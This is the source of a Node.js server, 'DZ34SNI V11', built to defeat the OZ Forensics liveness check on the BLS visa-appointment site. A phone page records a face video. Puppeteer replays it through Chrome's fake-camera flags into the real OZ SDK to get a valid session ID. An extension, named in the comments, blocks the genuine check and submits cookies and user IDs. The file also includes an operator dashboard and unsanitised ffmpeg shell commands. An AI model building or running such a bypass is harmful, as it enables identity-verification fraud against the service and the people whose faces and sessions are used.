/**
 * DZ34SNI Server V11 — Puppeteer OZ Replay
 * 
 * ARCHITECTURE:
 * 1. Pre-selfie: Phone captures video via face-api.js → saved on server
 * 2. Replay: Puppeteer opens OZ SDK with fake camera (pre-recorded video)
 *    → OZ SDK processes normally → returns REAL event_session_id
 * 3. Extension: Blocks real OZ on BLS, gets event_session_id from server
 * 
 * KEY INSIGHT: Chrome's --use-fake-device-for-media-stream flag
 * feeds a video file as camera input. The OZ WASM cannot detect this
 * because it's a native Chrome feature, not a script injection.
 */

const express = require('express');
const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    res.header('Access-Control-Allow-Headers', '*');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    const ts = new Date().toLocaleTimeString();
    console.log(`[${ts}] ${req.method} ${req.path}`);
    next();
});

// ═══ STATE ═══
const preSelfies = {};        // id → { id, label, phone, videoB64, videoPath, createdAt }
const phoneMap = {};           // phone → preselfie_id
const tasks = {};              // phone → { userId, transactionId, ... }
const results = {};            // phone → { event_session_id, ... }
const TMP_DIR = '/tmp/dz34sni';
try { fs.mkdirSync(TMP_DIR, { recursive: true }); } catch(e) {}

// ═══ PRE-SELFIE PAGE (face-api.js capture) ═══
app.get('/ai', (req, res) => {
    const data = req.query.Data || req.query.data || '';
    let label = 'Client', phone = '';
    try {
        const decoded = Buffer.from(data, 'base64').toString();
        const params = JSON.parse(decoded);
        label = params.label || params.n || 'Client';
        phone = params.phone || params.p || '';
    } catch(e) {
        // Try URL params directly
        label = req.query.label || req.query.n || 'Client';
        phone = req.query.phone || req.query.p || '';
    }
    res.send(getPreSelfiePage(label, phone));
});

// Legacy route
app.get('/pre-selfie', (req, res) => {
    const label = req.query.label || 'Client';
    const phone = req.query.phone || '';
    res.send(getPreSelfiePage(label, phone));
});

// ═══ PRE-SELFIE API ═══
app.post('/api/preselfie/save-video', (req, res) => {
    const { label, phone, video } = req.body;
    if (!video) return res.status(400).json({ ok: false, error: 'No video data' });

    const id = 'ps_' + crypto.randomBytes(6).toString('hex');
    
    // Save video to file
    const videoB64 = video.replace(/^data:video\/\w+;base64,/, '');
    const videoPath = path.join(TMP_DIR, `${id}.webm`);
    fs.writeFileSync(videoPath, Buffer.from(videoB64, 'base64'));

    // Convert to Y4M for Chrome fake camera
    const y4mPath = path.join(TMP_DIR, `${id}.y4m`);
    try {
        execSync(`ffmpeg -y -i ${videoPath} -pix_fmt yuv420p -r 30 -t 10 ${y4mPath} 2>/dev/null`);
        console.log(`[PRE-SELFIE] ✅ Video saved + converted: ${id} (${fs.statSync(y4mPath).size} bytes Y4M)`);
    } catch(e) {
        console.log(`[PRE-SELFIE] ⚠️ Y4M conversion failed, will use WebM: ${e.message}`);
    }

    preSelfies[id] = {
        id, label, phone,
        videoB64, videoPath, y4mPath,
        videoSize: Buffer.from(videoB64, 'base64').length,
        createdAt: Date.now(),
        useCount: 0, status: 'ready'
    };

    if (phone) phoneMap[phone] = id;

    res.json({ ok: true, id, label });
});

app.get('/api/preselfie/check/:phone', (req, res) => {
    const psId = phoneMap[req.params.phone.trim()];
    const ps = psId && preSelfies[psId];
    if (!ps) return res.json({ ok: false, preselfie: null });
    res.json({ ok: true, preselfie: { id: ps.id, label: ps.label, hasVideo: !!ps.videoB64, status: ps.status }});
});

app.get('/api/preselfies', (req, res) => {
    const list = Object.values(preSelfies).map(ps => ({
        id: ps.id, label: ps.label, phone: ps.phone,
        videoSize: ps.videoSize, status: ps.status,
        useCount: ps.useCount, age: Math.floor((Date.now() - ps.createdAt) / 1000) + 's'
    }));
    res.json({ ok: true, preselfies: list, mappings: phoneMap });
});

// ═══ TASK & RESULT API (for extension) ═══
app.post('/task/:phone', (req, res) => {
    const phone = req.params.phone;
    const { userId, transactionId, realIp, cookies, userAgent, pageUrl } = req.body;
    
    tasks[phone] = { userId, transactionId, realIp, cookies, userAgent, pageUrl, createdAt: Date.now() };
    console.log(`[TASK] New task for ${phone}: userId=${userId}`);

    // Check for pre-selfie
    const psId = phoneMap[phone];
    const ps = psId && preSelfies[psId];

    if (ps && ps.videoB64) {
        console.log(`[TASK] ⚡ Pre-selfie found: ${ps.label} → starting puppeteer replay`);
        
        // Start replay in background
        replayWithPuppeteer(ps, userId, transactionId, phone).catch(err => {
            console.error(`[REPLAY] ❌ Error:`, err.message);
        });

        return res.json({ ok: true, instant: true, preselfieLabel: ps.label });
    }

    res.json({ ok: true, instant: false });
});

app.get('/result/:phone', (req, res) => {
    const r = results[req.params.phone];
    if (r && r.event_session_id) {
        return res.json({ ok: true, result: r });
    }
    res.json({ ok: false });
});

app.delete('/clear/:phone', (req, res) => {
    delete tasks[req.params.phone];
    delete results[req.params.phone];
    res.json({ ok: true });
});

// ═══ PUPPETEER REPLAY — THE CORE ═══
async function replayWithPuppeteer(preSelfie, userId, transactionId, phone) {
    console.log(`[REPLAY] 🚀 Starting puppeteer replay for ${preSelfie.label}`);
    
    const y4mPath = preSelfie.y4mPath;
    const videoExists = y4mPath && fs.existsSync(y4mPath);
    
    if (!videoExists) {
        // Try to convert on the fly
        if (preSelfie.videoPath && fs.existsSync(preSelfie.videoPath)) {
            try {
                const tmpY4m = path.join(TMP_DIR, `replay_${Date.now()}.y4m`);
                execSync(`ffmpeg -y -i ${preSelfie.videoPath} -pix_fmt yuv420p -r 30 -t 10 ${tmpY4m} 2>/dev/null`);
                preSelfie.y4mPath = tmpY4m;
            } catch(e) {
                throw new Error('Cannot convert video to Y4M: ' + e.message);
            }
        } else {
            throw new Error('No video file available');
        }
    }

    const browser = await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--use-fake-ui-for-media-stream',        // Auto-accept camera permission
            '--use-fake-device-for-media-stream',     // Use fake camera
            `--use-file-for-fake-video-capture=${preSelfie.y4mPath}`, // Feed our video
            '--disable-web-security',
            '--allow-file-access-from-files'
        ]
    });

    try {
        const page = await browser.newPage();
        
        // Set viewport like a mobile device
        await page.setViewport({ width: 412, height: 915 });
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');

        // Listen for console messages
        page.on('console', msg => {
            const text = msg.text();
            if (text.includes('DZ34SNI') || text.includes('OzLiveness') || text.includes('event_session')) {
                console.log(`[REPLAY-PAGE] ${text}`);
            }
        });

        // Navigate to our OZ replay page
        const serverUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
        const replayUrl = `${serverUrl}/replay-page?userId=${encodeURIComponent(userId)}&transactionId=${encodeURIComponent(transactionId)}`;
        
        console.log(`[REPLAY] Navigating to: ${replayUrl}`);
        await page.goto(replayUrl, { waitUntil: 'networkidle2', timeout: 30000 });

        // Wait for OZ SDK to complete (max 120 seconds)
        console.log(`[REPLAY] Waiting for OZ SDK to complete...`);
        
        const result = await page.evaluate(() => {
            return new Promise((resolve) => {
                // Check if already done
                if (window.__ozResult) {
                    resolve(window.__ozResult);
                    return;
                }
                
                // Wait for completion event
                window.addEventListener('oz-complete', (e) => {
                    resolve(e.detail);
                });

                // Timeout after 120s
                setTimeout(() => resolve({ error: 'timeout' }), 120000);
            });
        });

        console.log(`[REPLAY] Result:`, JSON.stringify(result));

        if (result && result.event_session_id) {
            console.log(`[REPLAY] ✅ SUCCESS! event_session_id: ${result.event_session_id}`);
            results[phone] = {
                event_session_id: result.event_session_id,
                instant: true,
                timestamp: Date.now()
            };
            preSelfie.useCount++;
            preSelfie.status = 'used';
        } else {
            console.log(`[REPLAY] ❌ Failed:`, result);
            results[phone] = { error: result.error || 'unknown', instant: true, timestamp: Date.now() };
        }

    } finally {
        await browser.close();
        console.log(`[REPLAY] Browser closed`);
    }
}

// ═══ OZ REPLAY PAGE (loaded by puppeteer) ═══
app.get('/replay-page', (req, res) => {
    const userId = req.query.userId || '';
    const transactionId = req.query.transactionId || '';
    
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OZ Liveness</title>
</head>
<body>
    <div id="status">Loading OZ SDK...</div>

    <!-- Load OZ SDK from official Web Adapter -->
    <script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
    
    <script>
    (function() {
        var status = document.getElementById('status');
        
        function log(msg) {
            console.log('[DZ34SNI-REPLAY] ' + msg);
            status.textContent = msg;
        }

        // Wait for OzLiveness to be available
        var checkCount = 0;
        var checkInterval = setInterval(function() {
            checkCount++;
            if (typeof OzLiveness !== 'undefined' && OzLiveness.open) {
                clearInterval(checkInterval);
                startLiveness();
            } else if (checkCount > 100) {
                clearInterval(checkInterval);
                log('ERROR: OzLiveness not loaded after 10s');
                window.__ozResult = { error: 'sdk_not_loaded' };
                window.dispatchEvent(new CustomEvent('oz-complete', { detail: window.__ozResult }));
            }
        }, 100);

        function startLiveness() {
            log('OZ SDK loaded, starting liveness...');
            
            try {
                OzLiveness.open({
                    lang: 'en',
                    action: ['video_selfie_blank'],
                    meta: {
                        user_id: '${userId}',
                        transaction_id: '${transactionId}'
                    },
                    on_complete: function(result) {
                        log('✅ COMPLETE! session_id: ' + (result && result.event_session_id));
                        window.__ozResult = {
                            event_session_id: result.event_session_id || result.session_id || '',
                            status: result.status || 'completed'
                        };
                        window.dispatchEvent(new CustomEvent('oz-complete', { detail: window.__ozResult }));
                    },
                    on_error: function(err) {
                        log('❌ ERROR: ' + (err && err.message || err));
                        window.__ozResult = { error: err && err.message || String(err) };
                        window.dispatchEvent(new CustomEvent('oz-complete', { detail: window.__ozResult }));
                    }
                });
            } catch(e) {
                log('❌ Exception: ' + e.message);
                window.__ozResult = { error: e.message };
                window.dispatchEvent(new CustomEvent('oz-complete', { detail: window.__ozResult }));
            }
        }
    })();
    </script>
</body>
</html>`);
});

// ═══ DASHBOARD ═══
app.get('/dashboard', (req, res) => {
    res.send(`<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>DZ34SNI V11</title>
<style>
body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;margin:0}
h1{color:#f87171}
.card{background:#1e293b;padding:15px;border-radius:10px;margin:10px 0}
.btn{padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;margin:4px}
.btn-red{background:#dc2626;color:#fff}
.btn-blue{background:#2563eb;color:#fff}
pre{background:#0f172a;padding:10px;border-radius:6px;overflow-x:auto;font-size:12px}
input{padding:8px;border-radius:6px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;margin:4px}
</style></head><body>
<h1>🐉 DZ34SNI V11 — Puppeteer Replay</h1>
<div class="card">
<h3>📱 Créer Pre-Selfie Link</h3>
<input id="psLabel" placeholder="Nom (ex: AYOUB)" value="">
<input id="psPhone" placeholder="Téléphone" value="">
<button class="btn btn-red" onclick="createLink()">Créer Lien</button>
<div id="linkResult"></div>
</div>
<div class="card"><h3>📋 Pre-Selfies</h3><pre id="psData">Chargement...</pre></div>
<div class="card"><h3>🔧 Debug</h3><pre id="debugData">Chargement...</pre></div>
<script>
var SRV = location.origin;
function createLink() {
    var label = document.getElementById('psLabel').value || 'Client';
    var phone = document.getElementById('psPhone').value || '';
    var data = btoa(JSON.stringify({label:label,phone:phone}));
    var link = SRV + '/ai?Data=' + encodeURIComponent(data);
    document.getElementById('linkResult').innerHTML = '<br><a href="'+link+'" target="_blank" style="color:#60a5fa">'+link+'</a>';
}
function refresh() {
    fetch(SRV+'/api/preselfies').then(r=>r.json()).then(d=>{
        document.getElementById('psData').textContent = JSON.stringify(d,null,2);
    }).catch(()=>{});
    fetch(SRV+'/debug').then(r=>r.json()).then(d=>{
        document.getElementById('debugData').textContent = JSON.stringify(d,null,2);
    }).catch(()=>{});
}
refresh(); setInterval(refresh, 5000);
</script></body></html>`);
});

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.entries(tasks).map(([phone, t]) => ({ phone, userId: t.userId, age: Math.floor((Date.now() - t.createdAt) / 1000) + 's' })),
        results: Object.entries(results).map(([phone, r]) => ({ phone, event_session_id: r.event_session_id || null, error: r.error || null })),
        preselfies: Object.values(preSelfies).map(ps => ({ id: ps.id, label: ps.label, videoSize: ps.videoSize, status: ps.status })),
        mappings: phoneMap
    });
});

app.get('/', (req, res) => res.redirect('/dashboard'));

// ═══ PRE-SELFIE HTML PAGE ═══
function getPreSelfiePage(label, phone) {
    return `<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Pre-Selfie — ${label}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;color:#fff;font-family:system-ui;min-height:100vh;display:flex;flex-direction:column;align-items:center}
h2{margin:15px 0 5px;font-size:18px;color:#f87171}
#video-container{position:relative;width:90vw;max-width:400px;aspect-ratio:3/4;border-radius:16px;overflow:hidden;border:3px solid #334155;margin:10px 0}
video{width:100%;height:100%;object-fit:cover}
#overlay{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;pointer-events:none}
#face-guide{width:60%;aspect-ratio:3/4;border:3px dashed rgba(255,255,255,0.4);border-radius:50%}
.btn{padding:14px 30px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;margin:8px;min-width:160px}
.btn-start{background:#16a34a;color:#fff;font-size:20px}
.btn-stop{background:#dc2626;color:#fff;display:none}
#status{margin:10px;padding:10px 20px;border-radius:8px;text-align:center;font-weight:bold}
.ok{background:#065f46;color:#6ee7b7}
.err{background:#7f1d1d;color:#fca5a5}
.info{background:#1e3a5f;color:#93c5fd}
</style></head><body>
<h2>🐉 Pre-Selfie: ${label}</h2>
<div id="video-container">
    <video id="cam" autoplay playsinline muted></video>
    <div id="overlay"><div id="face-guide"></div></div>
</div>
<button id="startBtn" class="btn btn-start" onclick="startCapture()">📸 Démarrer</button>
<button id="stopBtn" class="btn btn-stop" onclick="stopCapture()">⏹ Arrêter</button>
<div id="status" class="info">Appuyez sur Démarrer</div>

<script>
var SRV = location.origin;
var LABEL = '${label}';
var PHONE = '${phone}';
var stream = null;
var recorder = null;
var chunks = [];

async function startCapture() {
    var st = document.getElementById('status');
    var startBtn = document.getElementById('startBtn');
    var stopBtn = document.getElementById('stopBtn');
    
    try {
        st.textContent = 'Accès caméra...';
        st.className = 'info';
        
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
        
        document.getElementById('cam').srcObject = stream;
        
        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        chunks = [];
        recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = uploadVideo;
        
        recorder.start();
        startBtn.style.display = 'none';
        stopBtn.style.display = 'inline-block';
        st.textContent = '🔴 Enregistrement... Regardez la caméra';
        st.className = 'err';
        
        // Auto-stop after 8 seconds
        setTimeout(function() {
            if (recorder && recorder.state === 'recording') stopCapture();
        }, 8000);
        
    } catch(e) {
        st.textContent = '❌ Erreur caméra: ' + e.message;
        st.className = 'err';
    }
}

function stopCapture() {
    if (recorder && recorder.state === 'recording') {
        recorder.stop();
    }
    document.getElementById('stopBtn').style.display = 'none';
    document.getElementById('status').textContent = '⏳ Envoi en cours...';
    document.getElementById('status').className = 'info';
}

async function uploadVideo() {
    var st = document.getElementById('status');
    try {
        var blob = new Blob(chunks, { type: 'video/webm' });
        var reader = new FileReader();
        reader.onload = async function() {
            var b64 = reader.result;
            var resp = await fetch(SRV + '/api/preselfie/save-video', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ label: LABEL, phone: PHONE, video: b64 })
            });
            var data = await resp.json();
            if (data.ok) {
                st.textContent = '✅ Selfie sauvegardé ! (' + data.id + ')';
                st.className = 'ok';
            } else {
                st.textContent = '❌ Erreur: ' + (data.error || 'unknown');
                st.className = 'err';
            }
        };
        reader.readAsDataURL(blob);
    } catch(e) {
        st.textContent = '❌ Erreur upload: ' + e.message;
        st.className = 'err';
    }
    
    // Stop camera
    if (stream) stream.getTracks().forEach(t => t.stop());
}
</script></body></html>`;
}

// ═══ START ═══
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🐉 DZ34SNI V11 Server running on port ${PORT}`);
    console.log(`   Dashboard: http://localhost:${PORT}/dashboard`);
});
